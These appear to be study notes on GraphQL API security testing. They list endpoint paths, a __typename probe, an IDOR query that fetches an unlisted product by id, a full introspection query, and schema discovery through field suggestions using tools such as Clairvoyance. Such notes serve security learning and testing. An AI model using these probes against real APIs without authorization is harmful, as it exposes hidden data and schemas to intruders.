# GraphQL API vulnerabilities

## 1. Finding endpoints
```
/graphql(/v1)
/api(/v1)
/api/graphql(/v1)
/graphql/api(/v1)
/graphql/graphql(/v1)
```
### Universal queries
`__typename` reserved keyword.

Send request to endpoint `query{__typename}`
Response contains `{"data": {"__typename": "query"}} `

Send non-GraphQL request
Response : `query not present` or similar

### Request methods
best practices, only POST with content-type `application/json` (CSRF protection)
possible endpoints accepts GET, or POST with content-type `x-www-form-urlencoded`

## 2. Exploiting unsanitized arguments
Could lead to IDOR.
```
query {
        products {
            id
            name
            listed
        }
    }
```
return list `1,2,4`. `3` not showed
```
query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```
## 3. Introspection queries
Secure API has introspection disabled.
```
 {
        "query": "{__schema{queryType{name}}}"
    }
```
```
query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
### GraphQL Visualizer - online tool

### Suggestions
Even if introspection is disabled, suggestion still active.
`There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).`
Tools: 
- Clairvoyance
- Burp scanner (GraphQL suggestions enabled)





